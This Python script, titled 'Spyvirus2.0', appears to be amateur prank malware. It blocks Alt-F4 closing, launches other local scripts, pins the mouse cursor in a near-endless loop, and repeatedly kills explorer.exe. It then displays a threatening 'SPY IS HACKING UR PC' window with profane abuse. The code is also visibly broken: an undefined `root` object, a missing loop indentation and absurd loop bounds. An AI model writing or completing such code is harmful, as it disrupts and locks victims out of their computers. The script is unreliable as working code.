import os
import time
import tkinter as tk
from threading import Thread
import ctypes
pressed_f4 = False

def do_exit():
    global pressed_f4
    print('Trying to close application')
    if pressed_f4:
        print('Denied!')
        pressed_f4 = False
    else:
        close()

def alt_f4(event):
    global pressed_f4
    print('Alt-F4 pressed')
    pressed_f4 = True

def close(*event):
    root.destroy()

root.bind('<Alt-F4>', alt_f4)
root.bind('<Escape>', close)
root.protocol("WM_DELETE_WINDOW",do_exit)

root.mainloop()
def func1():
    os.system("python C:/spei/window1.py")
    time.sleep(10)   

def func2():
    os.system("python C:/spei/rtd.py")

if __name__ == '__main__':
    Thread(target = func1).start()
    Thread(target = func2).start()
    for i in range(0,999999999999999999999999999999999999999999999999999999):
    time.sleep(0.1)
    ctypes.windll.user32.SetCursorPos(100, 20)
for i in range(0,999999999999999999999999999999999999999999999999999999):
    time.sleep(0.1)
    os.system("taskkill /im explorer.exe")

window = tk.Tk() 
window.title( "Spyvirus2.0" )
text = tk.StringVar()
label = tk.Label( window, textvariable = text, padx=100, pady=20)
label.pack()
text.set("SPY IS HACKING UR PC")
description = tk.Label(window, text="any last words?:").pack()
name = tk.Entry(window,width=40)
name.pack()

def Spyvirusmain():
    text.set("{0} - I WILL NOT READ THIS, HERE GO FUCK YOURSELF ".format(name.get()))
ok = tk.Button(window, text="OK", width=20, command=Spyvirusmain)
ok.pack()

os.system("start C:\spei\image.py")

os.system("start C:\spei\weird.cmd")
